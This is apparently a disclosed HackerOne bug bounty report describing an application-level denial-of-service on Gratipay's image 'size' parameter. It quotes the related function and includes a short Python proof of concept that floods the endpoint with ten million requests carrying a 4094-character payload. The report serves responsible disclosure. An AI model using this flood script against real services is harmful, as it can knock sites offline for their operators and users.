# Application-level DoS on image's "size" parameter.

## Report Details
- **Report ID**: 247700
- **URL**: https://hackerone.com/reports/247700
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-07-10T12:41:39.049Z
- **Disclosed**: 2017-11-02T19:16:20.811Z

## Reporter
- **Username**: edoverflow
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gratipay

## Vulnerability Information
# Summary
---

The `size` parameter located on images is vulnerable to DoS. By modifying the parameter's value an attacker can cause the application to work very slowly.

# Description
---

The issue is located in the `get_image_url()` function in `gratipay/models/team/__init__.py` and can be exploited by replacing the `small` or `large` values in the following GET request: `http://<GRATIPAY INSTANCE>/<USER>/image?size=small`.

~~~python
# Images
# ======

IMAGE_SIZES = ('original', 'large', 'small')

def get_image_url(self, size):
    assert size in ('original', 'large', 'small'), size
    return '/{}/image?size={}'.format(self.slug, size)
~~~

Link: https://github.com/gratipay/gratipay.com/blob/1985e43033edd87bd16cdb46c16adbcda0bb6bc4/gratipay/models/team/__init__.py#L312-L314

# How can this issue be exploited?
---

Repeatedly sending values of 4094 characters in length will cause the DoS.

~~~python
import requests
payload = "a" * 4094
url = "http://<GRATIPAY INSTANCE>/<USER>/image?size=small" + payload

for i in range(10000000):
	requests.get(url)
~~~

## Attachments
No attachments
